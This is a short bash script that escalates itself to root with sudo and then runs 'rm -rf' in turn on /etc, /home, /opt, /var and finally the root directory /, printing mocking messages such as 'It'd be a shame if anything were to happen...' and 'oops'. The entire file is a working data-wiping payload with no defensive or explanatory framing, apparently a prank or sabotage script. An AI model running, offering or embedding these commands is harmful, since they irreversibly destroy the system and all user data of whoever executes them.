#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  sudo "$0" "$@"
  exit
fi
function go_time(){
  ls $direct
  echo "Well well well... sure looks nice, doesn't it?"
  echo "It'd be a shame if anything were to happen..."
  sleep 1
  sudo rm -rf $direct
  ls $direct
  echo "huh... wonder where that went"
  echo "oops"
}
direct="/etc"
go_time
direct="/home"
go_time
direct="/opt"
go_time
direct="/var"
go_time
direct="/"
echo "goodbye..."
sleep 1
go_time
